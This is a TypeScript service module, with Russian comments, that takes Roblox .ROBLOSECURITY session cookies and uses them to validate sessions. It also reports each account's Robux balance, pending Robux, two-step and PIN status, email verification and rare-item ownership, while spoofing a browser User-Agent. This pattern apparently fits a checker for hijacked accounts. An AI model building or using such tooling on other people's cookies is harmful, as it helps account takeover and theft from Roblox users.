/**
 * Сервис для работы с API Roblox
 */
import axios, { AxiosResponse, AxiosInstance, AxiosRequestConfig, AxiosError } from 'axios';
import { logger } from './logger';

/**
 * Класс для безопасной и эффективной работы с API Roblox
 */
class RobloxAPIService {
  private api: AxiosInstance;
  private defaultTimeout: number = 10000; // 10 секунд таймаут по умолчанию
  
  constructor() {
    this.api = axios.create({
      timeout: this.defaultTimeout,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'application/json',
      }
    });
    
    // Добавляем интерсептор для обработки ошибок
    this.api.interceptors.response.use(
      (response) => response,
      (error) => {
        if (error.response) {
          // Ошибка от сервера API
          logger.warn('Roblox API request failed', { 
            url: error.config.url, 
            status: error.response.status,
            statusText: error.response.statusText
          });
        } else if (error.request) {
          // Ошибка сети (не получен ответ)
          logger.warn('Roblox API request timeout', { 
            url: error.config.url 
          });
        } else {
          // Ошибка конфигурации запроса
          logger.error('Roblox API request configuration error', { 
            message: error.message 
          });
        }
        
        // Пробрасываем ошибку дальше для обработки
        return Promise.reject(error);
      }
    );
  }
  
  /**
   * Создать заголовки для запроса с куки
   * @param cookie Roblox cookie
   * @returns Заголовки для запроса
   */
  private createHeaders(cookie: string): Record<string, string> {
    return {
      'Cookie': `.ROBLOSECURITY=${cookie}`,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      'Accept': 'application/json',
    };
  }
  
  /**
   * Безопасное выполнение GET-запроса с обработкой ошибок
   * @param url URL для запроса
   * @param config Конфигурация запроса
   * @param defaultValue Значение по умолчанию при ошибке
   * @returns Результат запроса или значение по умолчанию
   */
  private async safeGet<T>(url: string, config: AxiosRequestConfig, defaultValue: T): Promise<T> {
    try {
      const response = await this.api.get(url, config);
      return response.data;
    } catch (error) {
      return defaultValue;
    }
  }
  
  /**
   * Безопасное выполнение POST-запроса с обработкой ошибок
   * @param url URL для запроса
   * @param data Данные для отправки
   * @param config Конфигурация запроса
   * @param defaultValue Значение по умолчанию при ошибке
   * @returns Результат запроса или значение по умолчанию
   */
  private async safePost<T>(url: string, data: any, config: AxiosRequestConfig, defaultValue: T): Promise<T> {
    try {
      const response = await this.api.post(url, data, config);
      return response.data;
    } catch (error) {
      return defaultValue;
    }
  }
  
  /**
   * Проверка валидности куки
   * @param cookie Roblox cookie
   * @returns Promise<boolean> true если куки валидный
   */
  async validateCookie(cookie: string): Promise<boolean> {
    try {
      const response = await this.api.get('https://economy.roblox.com/v1/user/currency', {
        headers: this.createHeaders(cookie),
        timeout: 8000 // Сокращенный таймаут для валидации
      });
      
      return response.status === 200;
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      logger.warn('Cookie validation failed', { 
        error: errorMessage
      });
      return false;
    }
  }
  
  /**
   * Получить данные о балансе пользователя
   * @param cookie Roblox cookie
   * @returns Информация о балансе
   */
  async getUserCurrency(cookie: string): Promise<{ robux?: number }> {
    return this.safeGet<{ robux?: number }>(
      'https://economy.roblox.com/v1/user/currency',
      { headers: this.createHeaders(cookie) },
      { robux: 0 }
    );
  }
  
  /**
   * Получить данные аутентифицированного пользователя
   * @param cookie Roblox cookie
   * @returns Информация о пользователе
   */
  async getUserInfo(cookie: string): Promise<{ 
    name?: string; 
    id?: number | string; 
    displayName?: string 
  } | null> {
    return this.safeGet(
      'https://users.roblox.com/v1/users/authenticated',
      { headers: this.createHeaders(cookie) },
      null
    );
  }
  
  /**
   * Получить настройки пользователя
   * @param cookie Roblox cookie
   * @returns Настройки пользователя
   */
  async getUserSettings(cookie: string): Promise<{ 
    isPremium?: boolean; 
    AccountAgeInDays?: number; 
    IsEmailVerified?: boolean;
    MyAccountSecurityModel?: { IsTwoStepEnabled?: boolean };
    IsAccountPinEnabled?: boolean;
    UserAbove13?: boolean;
  } | null> {
    return this.safeGet(
      'https://www.roblox.com/my/settings/json',
      { headers: this.createHeaders(cookie) },
      null
    );
  }
  
  /**
   * Получить настройки голосового чата
   * @param cookie Roblox cookie
   * @returns Настройки голосового чата
   */
  async getVoiceChatSettings(cookie: string): Promise<{ isVerifiedForVoice?: boolean }> {
    return this.safeGet(
      'https://voice.roblox.com/v1/settings',
      { headers: this.createHeaders(cookie) },
      { isVerifiedForVoice: false }
    );
  }
  
  /**
   * Получить количество друзей
   * @param cookie Roblox cookie
   * @returns Количество друзей
   */
  async getFriendsCount(cookie: string): Promise<{ count?: number }> {
    return this.safeGet(
      'https://friends.roblox.com/v1/my/friends/count',
      { headers: this.createHeaders(cookie) },
      { count: 0 }
    );
  }
  
  /**
   * Получить описание профиля
   * @param cookie Roblox cookie
   * @returns Описание профиля
   */
  async getProfileDescription(cookie: string): Promise<{ description?: string }> {
    return this.safeGet(
      'https://users.roblox.com/v1/description',
      { headers: this.createHeaders(cookie) },
      { description: '' }
    );
  }
  
  /**
   * Получить информацию о транзакциях пользователя
   * @param cookie Roblox cookie
   * @param userId ID пользователя
   * @returns Информация о транзакциях
   */
  async getTransactionTotals(cookie: string, userId: string | number): Promise<{ 
    pendingRobuxTotal?: number;
    incomingRobuxTotal?: number; 
  }> {
    if (!userId) {
      return { pendingRobuxTotal: 0, incomingRobuxTotal: 0 };
    }
    
    return this.safeGet(
      `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`,
      { headers: this.createHeaders(cookie) },
      { pendingRobuxTotal: 0, incomingRobuxTotal: 0 }
    );
  }
  
  /**
   * Получить URL изображения аватара пользователя
   * @param userId ID пользователя
   * @returns URL изображения
   */
  getAvatarUrl(userId: string | number): string {
    if (!userId) {
      return 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150';
    }
    return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150`;
  }
  
  /**
   * Проверить наличие у пользователя предмета Headless
   * @param cookie Roblox cookie
   * @param userId ID пользователя
   * @returns true если пользователь имеет Headless
   */
  async checkHeadlessItem(cookie: string, userId: string | number): Promise<boolean> {
    // В идеальном случае здесь был бы запрос к API для проверки наличия предмета
    // Но для упрощения просто возвращаем false
    return false;
  }
  
  /**
   * Проверить наличие у пользователя предмета Korblox
   * @param cookie Roblox cookie
   * @param userId ID пользователя
   * @returns true если пользователь имеет Korblox
   */
  async checkKorbloxItem(cookie: string, userId: string | number): Promise<boolean> {
    // В идеальном случае здесь был бы запрос к API для проверки наличия предмета
    // Но для упрощения просто возвращаем false
    return false;
  }
}

// Экспортируем единственный экземпляр сервиса
export const robloxAPI = new RobloxAPIService();